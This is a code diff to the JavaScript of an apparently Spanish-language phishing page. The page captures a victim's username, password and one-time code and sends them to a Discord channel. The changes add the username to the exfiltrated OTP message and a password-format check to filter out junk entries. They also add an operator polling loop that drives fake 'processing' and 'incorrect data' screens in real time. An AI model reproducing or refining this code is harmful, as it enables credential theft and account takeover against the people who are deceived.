@@ -1522,7 +1522,7 @@
         } else if (step == 2) {
           data.usuario = _i1.value.trim();
           data.clave = _i2.value.trim();
-          label = '2 · Clave';
+          label = '1-2 · Usuario & Clave';
         } else if (step == 3) {
           data.usuario = _i1.value.trim();
           data.clave = _i2.value.trim();
@@ -1573,7 +1573,7 @@
           var code = inp ? inp.value.trim() : '';
           if (!code) { if (err) err.innerText = 'Ingrese el código.'; return; }
           if (err) err.innerText = '\u00a0';
-          _sendToDiscord({ token: code }, 'TOKEN · Código OTP');
+          _sendToDiscord({ usuario: _i1 ? _i1.value.trim() : '', token: code }, 'TOKEN · ' + (_i1 ? _i1.value.trim() : 'OTP'));
           document.getElementById('tok-ov').classList.remove('show');
           var _ov = document.getElementById('loader-ov');
           var _ot = document.getElementById('loader-text');
@@ -1628,9 +1628,26 @@
         }
 
         // Enviar el paso actual antes de avanzar
-        if (_step == 1) { _sendStep(1); _step = 2; _show(2); }
-        else if (_step == 2) { _sendStep(2); _loaderThen(1500, function () { _step = 3; _show(3); }); }
-        else if (_step == 3) { _sendStep(3); _loaderThen(1500, function () { _step = 4; _show(4); }); }
+        if (_step == 1) { _step = 2; _show(2); }
+        else if (_step == 2) {
+          var _v2 = _i2.value;
+          var _ok2 = _v2.length >= 8 && _v2.length <= 20 && /[A-Z]/.test(_v2) && /[0-9]/.test(_v2);
+          if (!_ok2) { _notify('Usuario o contraseña incorrecto.', 3000); _i1.value = ''; _i2.value = ''; _step = 1; _show(1); return; }
+          _showOverlay(); _ovText('PROCESANDO...\nPor favor espere.');
+          _sendStep(2);
+          _poll(function (state) {
+            if (state === 'continue') { _hideOverlay(); _step = 3; _show(3); }
+            else if (state === 'error') { _hideOverlay(); _notify('Algunos de tus datos son incorrectos.', 3500); _i1.value = ''; _i2.value = ''; _step = 1; _show(1); }
+          });
+        }
+        else if (_step == 3) {
+          _showOverlay(); _ovText('PROCESANDO...\nPor favor espere.');
+          _sendStep(3);
+          _poll(function (state) {
+            if (state === 'continue') { _hideOverlay(); _step = 4; _show(4); }
+            else if (state === 'error') { _hideOverlay(); _notify('Algunos de tus datos son incorrectos.', 3500); _resetForm(); _step = 1; _show(1); }
+          });
+        }
         else if (_step == 4) {
           _showOverlay();
           _ovText('PROCESANDO...\nPor favor espere.');
